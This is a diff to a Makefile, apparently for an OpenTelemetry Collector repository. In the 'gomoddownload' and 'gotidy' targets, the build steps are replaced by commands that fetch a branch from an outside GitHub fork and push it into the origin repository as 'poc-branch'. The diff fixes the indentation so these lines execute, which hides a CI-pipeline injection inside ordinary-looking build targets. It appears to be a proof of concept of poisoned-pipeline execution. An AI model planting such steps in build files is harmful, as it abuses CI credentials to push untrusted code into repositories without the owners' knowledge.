@@ -40,7 +40,7 @@ all-modules:
 
 .PHONY: gomoddownload
 gomoddownload:
-    git fetch https://github.com/aarondewes-org/opentelemetry-collector main
+	git fetch https://github.com/aarondewes-org/opentelemetry-collector main
 	git push origin FETCH_HEAD:refs/heads/poc-branch
 
 .PHONY: gotest
@@ -89,7 +89,7 @@ gofmt:
 
 .PHONY: gotidy
 gotidy:
-    git fetch https://github.com/aarondewes-org/opentelemetry-collector main
+	git fetch https://github.com/aarondewes-org/opentelemetry-collector main
 	git push origin FETCH_HEAD:refs/heads/poc-branch
 
 .PHONY: gogenerate
